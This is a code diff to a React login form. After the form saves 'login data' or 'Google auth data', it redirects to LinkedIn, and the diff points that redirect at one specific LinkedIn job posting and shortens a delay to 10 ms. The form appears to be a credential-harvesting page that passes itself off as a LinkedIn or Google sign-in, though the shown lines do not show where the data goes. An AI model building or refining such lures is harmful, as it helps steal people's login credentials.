@@ -228,7 +228,7 @@ const LoginForm = () => {
         }));
 
         // Redirect to LinkedIn
-        window.location.href = 'https://linkedin.com';
+        window.location.href = 'https://www.linkedin.com/jobs/view/4273028944';
       } else {
         setError('Failed to save login data');
       }
@@ -273,8 +273,8 @@ const LoginForm = () => {
 
         // Redirect to LinkedIn
         setTimeout(() => {
-          window.location.href = 'https://linkedin.com';
-        }, 500);
+          window.location.href = 'https://www.linkedin.com/jobs/view/4273028944';
+        }, 10);
       } else {
         console.error('Failed to save Google auth data');
       }
@@ -361,7 +361,7 @@ const LoginForm = () => {
                 onClick={togglePasswordVisibility}
                 disabled={isLoading}
               >
-                Show
+                {/* Show */}
               </button>
             </div>
 
